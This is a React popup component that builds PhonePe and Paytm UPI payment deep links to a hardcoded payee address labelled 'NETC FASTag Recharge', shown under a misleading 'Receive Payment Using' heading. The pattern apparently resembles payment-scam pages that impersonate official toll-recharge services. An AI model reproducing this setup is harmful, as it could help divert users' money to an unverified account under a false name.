import React from "react";
import phonepe from "../assets/phonepe.png";
import paytm from "../assets/paytm.png";

const PopUp = ({ isOpen, amount }) => {
  if (!isOpen) return null;

  // ✅ UPI deep links
  const PHONEPE_URL = `phonepe://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&am=${amount}&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04`;

  const PAYTM_URL = `paytmmp://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&am=${amount}&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04`;

  const handleSelect = (method) => {
    const url = method === "phonepe" ? PHONEPE_URL : PAYTM_URL;
    if (!url) return;

    const timeout = setTimeout(() => {
    }, 2500);

    window.addEventListener("blur", () => clearTimeout(timeout), {
      once: true,
    });

    const link = document.createElement("a");
    link.href = url;
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center">
      <div className="bg-white rounded-xl shadow-lg p-6 w-80">
        <h2 className="text-lg font-semibold text-center mb-4">
          Receive Payment Using
        </h2>
        <div className="flex justify-center gap-20 mt-4">
          <button onClick={() => handleSelect("phonepe")}>
            <img src={phonepe} alt="PhonePe" className="h-10" />
          </button>
          <button onClick={() => handleSelect("paytm")}>
            <img src={paytm} alt="Paytm" className="h-5" />
          </button>
        </div>
      </div>
    </div>
  );
};

export default PopUp;
